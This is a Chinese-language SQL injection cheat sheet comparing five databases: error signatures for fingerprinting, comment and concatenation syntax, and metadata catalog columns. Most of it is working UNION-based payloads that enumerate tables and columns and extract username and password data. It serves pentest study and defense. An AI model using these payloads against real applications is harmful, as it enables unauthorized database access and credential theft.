# SQL 注入 · 五种数据库差异速查

> 判断出数据库类型后，注释符、拼接方式、查版本、查元数据的语法各不相同。

## 1. 通过报错判断

| 数据库 | 报错特征 |
|---|---|
| MySQL | `You have an error in your SQL syntax` |
| PostgreSQL | `PostgreSQL.*ERROR` / `syntax error at or near` |
| SQL Server | `Microsoft OLE DB` / `Unclosed quotation mark` |
| Oracle | `ORA-00933` / `ORA-` 前缀 |
| SQLite | `SQLite3::` / `near "..." syntax error` |

## 2. 语法差异

### （1）注释符

| 数据库 | 注释符 |
|---|---|
| PostgreSQL、SQL Server、Oracle、SQLite | `--` |
| MySQL | `-- `（空格）/ `--+` / `#` |

> MySQL 的 `--` 后面必须跟一个空白字符才生效。URL 里空格会被编码成 `+`（或 `%20`），所以 `--+` 本质就是 `-- ` 加空格，不是额外的符号。

### （2）字符串拼接

| 数据库 | 拼接方式 |
|---|---|
| PostgreSQL、Oracle、SQLite | `\|\|` |
| SQL Server | `+` |
| MySQL | `CONCAT(a,b,c)` |

### （3）查版本

MySQL：

```
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--
```

PostgreSQL：

```
' UNION SELECT version(),NULL--
```

SQL Server：

```
' UNION SELECT @@version,NULL--
```

Oracle：

```
' UNION SELECT banner,NULL FROM v$version--
```

SQLite：

```
' UNION SELECT sqlite_version(),NULL--
```

> 查版本也需要先确定列数和回显列，在任意回显列处进行版本查询。

### （4）查表名、列名（需先确定列数和回显列）

MySQL、PostgreSQL、SQL Server

表名列表：`information_schema.tables`　列名列表：`information_schema.columns`

1. 找到最可能需要的表名（users）

```
' UNION SELECT NULL,table_name FROM information_schema.tables--
```

2. 找到最可能需要的列名（username、password）

```
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
```

3. 查数据

```
' UNION SELECT username,password FROM users--
```

Oracle

表名列表：`all_tables`　列名列表：`all_tab_columns`

1. 找到最可能需要的表名（USERS）

```
' UNION SELECT NULL,table_name FROM all_tables--
```

2. 找到最可能需要的列名（username、password）

```
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--
```

3. 查数据

```
' UNION SELECT username,password FROM USERS--
```

SQLite

列表：`sqlite_master`（`type='table'`）

1. 找到最可能需要的表名（users）

```
' UNION SELECT NULL,name FROM sqlite_master WHERE type='table'--
```

2. 找到最可能需要的列名（username、password）

```
' UNION SELECT NULL,sql FROM sqlite_master WHERE type='table' AND name='users'--
```

3. 查数据

```
' UNION SELECT username,password FROM users--
```

## 3. 元数据表的固定列名

| 元数据表 | 固有列名 |
|---|---|
| `information_schema.tables` | `TABLE_NAME` |
| `information_schema.columns` | `COLUMN_NAME`、`DATA_TYPE` |
| `all_tables` | `TABLE_NAME` |
| `all_tab_columns` | `COLUMN_NAME`、`DATA_TYPE` |
| `sqlite_master` | `name`、`sql`（建表/建索引语句原文） |
